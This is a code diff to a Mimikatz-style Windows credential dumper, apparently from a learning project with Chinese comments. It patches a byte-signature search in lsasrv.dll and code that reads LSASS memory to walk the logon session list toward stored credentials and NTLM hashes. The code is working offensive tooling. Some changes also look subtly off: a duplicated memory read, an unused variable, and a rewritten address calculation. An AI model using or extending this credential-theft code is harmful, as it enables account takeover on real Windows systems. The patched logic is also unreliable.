@@ -316,11 +316,13 @@ VOID GetCredentialsFromWdigest() {
 ///		KIWI_MSV1_0_PRIMARY_CREDENTIALS
 VOID GetCredentialsFromMSV() {
 	DWORD keySigOffset = 0;
+	KIWI_MSV1_0_LIST_63 entry;
 	DWORD logSessListSigOffset, LogonSessionListOffset;
 	PKIWI_MSV1_0_LIST_63 logSessListAddr = NULL;	// List Header
 
 	/// ... 请修改
 
+	// .text:00000001800BF83A 48 FF 15 27 3C 08 00    call    cs:__imp_RtlAcquireResourceShared
 	// .text:00000001800BF841 0F 1F 44 00 00          nop     dword ptr[rax + rax + 00h]
 	// .text:00000001800BF846 48 C1 E3 04             shl     rbx, 4
 	// .text:00000001800BF84A 4D 8D B7 C0 62 18 00    lea     r14, rva ? LogonSessionList@@3PAU_LIST_ENTRY@@A[r15]; _LIST_ENTRY near* LogonSessionList
@@ -328,7 +330,8 @@ VOID GetCredentialsFromMSV() {
 
 	PUCHAR lsasrvBaseAddress = (PUCHAR)LoadLibraryA("lsasrv.dll");
 
-	UCHAR keySig[] = { 0x0F, 0x1F, 0x44, 0x00, 0x00,
+	UCHAR keySig[] = {	0x48, 0xFF, 0x15, 0x27, 0x3C, 0x08, 0x00,
+						0x0F, 0x1F, 0x44, 0x00, 0x00,
 						0x48, 0xC1, 0xE3, 0x04,
 						0x4D, 0x8D, 0xB7 };
 
@@ -336,12 +339,12 @@ VOID GetCredentialsFromMSV() {
 	if (keySigOffset == 0) return;
 	wprintf(L"keySigOffset = 0x%x\n", keySigOffset);
 
-	// 从lsass进程的内存位置lsasrvBaseAddress + keySigOffset + sizeof keySig 上读取4字节的偏移
-	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof keySig, &LogonSessionListOffset, sizeof LogonSessionListOffset);
+	// 读取LogonSessionList的RVA
+	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof(keySig), &LogonSessionListOffset, sizeof(LogonSessionListOffset));
 	wprintf(L"LogonSessionListOffset = 0x%x\n", LogonSessionListOffset);
 
-	// 计算logSessListAddr全局变量地址
-	logSessListAddr = (PKIWI_MSV1_0_LIST_63)(lsasrvBaseAddress + keySigOffset + sizeof keySig + 4 + LogonSessionListOffset);
+	// 计算全局变量LogonSessionList的地址
+	logSessListAddr = (PKIWI_MSV1_0_LIST_63)(lsasrvBaseAddress + LogonSessionListOffset);
 	wprintf(L"logSessListAddr = 0x%p\n", logSessListAddr);
 
 	PKIWI_MSV1_0_LIST_63 pList = logSessListAddr;
@@ -355,6 +358,8 @@ VOID GetCredentialsFromMSV() {
 		// wprintf(L"NTLMHash: %ls\n\n", );
 
 		ReadFromLsass(pList, &listEntry, sizeof(KIWI_MSV1_0_LIST_63));
+
+		bool readOk = ReadFromLsass(pList, &listEntry, sizeof(KIWI_MSV1_0_LIST_63));
 
 		// 读取凭据链表头
 		PKIWI_MSV1_0_CREDENTIALS credPtr = listEntry.Credentials;
